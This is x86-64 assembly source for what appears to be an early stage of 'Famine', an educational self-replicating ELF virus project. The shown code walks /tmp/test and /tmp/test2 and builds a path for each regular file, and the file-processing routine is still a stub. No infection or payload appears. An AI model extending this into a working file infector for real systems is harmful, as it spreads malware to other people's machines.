%include "inc/famine.inc"

default rel

section .text
    ; Trazas
    hello db            "[+] Hello",10,0  ;11

    global _start
    dirs db         "/tmp/test",0,"/tmp/test2",0,0

    _start:

    mov rbp, rsp
    sub rbp, famine_size            ;generate stack

    ;load dirs
    lea rdi, [dirs]  
    
    .open_dir:
        mov r14, rdi
        cmp byte [rdi], 0
        je .exit
        mov rax, SC_OPEN
        mov rsi, O_RDONLY | O_DIRECTORY
        syscall
        test rax, rax
        jl .next_dir
        mov VAR(famine.fd_dir), rax

        .dirent:
            mov rax, SC_GETDENTS
            mov rdi, VAR(famine.fd_dir)
            lea rsi, VAR(famine.dirent_struc)
            mov rdx, 1024
            syscall
            test rax, rax
            jle .close_dir
            xor r12, r12            

        ; rdi = dirent_struct[0]
        ; r12 = offset to dirent_struc node
        ; rax = total bytes read in getdents
        .validate_files_types:
            lea rdi, VAR(famine.dirent_struc)
            add rdi, r12
            movzx edx, word [rdi + dirent.d_len]
            add r12, rdx
            cmp byte [rdi + rdx - 1], REGULAR_FILE
            jne .next_file
            add rdi, dirent.d_name
            call process

        .next_file:
            cmp r12, rax
            jb .validate_files_types
            
        .close_dir:
            mov rax, SC_CLOSE
            mov rdi, VAR(famine.fd_dir)
            syscall

        .next_dir:
            mov rsi, r14
        .find_null:
            lodsb               ; al = *rsi++
            test al, al
            jnz .find_null

            mov rdi, rsi
            cmp byte [rdi], 0   ; find double null
            jnz .open_dir

        .exit:
            mov rax, SC_EXIT
            syscall
    
    ; r14 = file_dir
    ; rdi = file_name
    process:
        mov r15, rdi
        mov rsi, r14
        lea rdi, VAR(famine.file_full_path)
        cld

        ;generate file_full_path
        .copy_dir_path:
            movsb
            cmp byte [rsi], 0
            jnz .copy_dir_path
            mov [rdi], 0x2F         ; char "/"
            inc rdi
            mov rsi, r15

        .copy_file_path:
            movsb
            cmp byte [rsi], 0
            jnz .copy_file_path

        .test:
            lea r15, VAR(famine.file_full_path)
        ret
    
    